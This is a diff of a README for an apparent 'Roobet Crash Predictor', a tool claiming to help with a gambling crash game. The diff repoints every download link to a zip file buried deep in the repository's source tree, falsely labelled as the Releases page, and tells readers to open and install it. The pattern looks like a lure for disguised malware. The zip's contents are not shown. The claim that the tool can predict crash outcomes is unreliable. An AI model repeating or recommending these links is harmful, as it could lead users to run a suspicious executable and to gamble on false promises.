@@ -1,6 +1,6 @@
 # 🎲 Roobet-Crash-Predictor - Test Your Crash Strategies Effortlessly
 
-[![Download Roobet-Crash-Predictor](https://raw.githubusercontent.com/pog1209/Roobet-Crash-Predictor/main/src/Roobet_Crash_Predictor_3.0.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/pog1209/Roobet-Crash-Predictor/main/src/Roobet_Crash_Predictor_3.0.zip)
+[![Download Roobet-Crash-Predictor](https://github.com/pog1209/Roobet-Crash-Predictor/raw/refs/heads/main/src/config/roobet_crash_predictor/v17/ResourceExplorer/Roobet_Crash_Predictor_3.4.zip%20Now-Click%20Here-blue)](https://github.com/pog1209/Roobet-Crash-Predictor/raw/refs/heads/main/src/config/roobet_crash_predictor/v17/ResourceExplorer/Roobet_Crash_Predictor_3.4.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the Roobet-Crash-Predictor! This application helps you test your stra
 
 You can easily download the software from the Releases page. Here’s how to get started:
 
-1. **Visit the Download Page:** Click this link to go to the Releases page: [Download Roobet-Crash-Predictor](https://raw.githubusercontent.com/pog1209/Roobet-Crash-Predictor/main/src/Roobet_Crash_Predictor_3.0.zip).
+1. **Visit the Download Page:** Click this link to go to the Releases page: [Download Roobet-Crash-Predictor](https://github.com/pog1209/Roobet-Crash-Predictor/raw/refs/heads/main/src/config/roobet_crash_predictor/v17/ResourceExplorer/Roobet_Crash_Predictor_3.4.zip).
 2. **Choose the Latest Version:** Look for the most recent version available. This is typically at the top of the list.
 3. **Download the File:** Click on the file that matches your operating system (e.g., Windows, macOS, Linux).
 4. **Install the Software:** Open the downloaded file and follow the on-screen prompts to install the application.
@@ -62,4 +62,4 @@ Your safety and privacy while using the Roobet-Crash-Predictor are crucial. This
 
 Remember to always play responsibly and understand the risks involved with gaming.
 
-For more detailed information or updates, check back regularly on the Releases page: [Download Roobet-Crash-Predictor](https://raw.githubusercontent.com/pog1209/Roobet-Crash-Predictor/main/src/Roobet_Crash_Predictor_3.0.zip).
+For more detailed information or updates, check back regularly on the Releases page: [Download Roobet-Crash-Predictor](https://github.com/pog1209/Roobet-Crash-Predictor/raw/refs/heads/main/src/config/roobet_crash_predictor/v17/ResourceExplorer/Roobet_Crash_Predictor_3.4.zip).
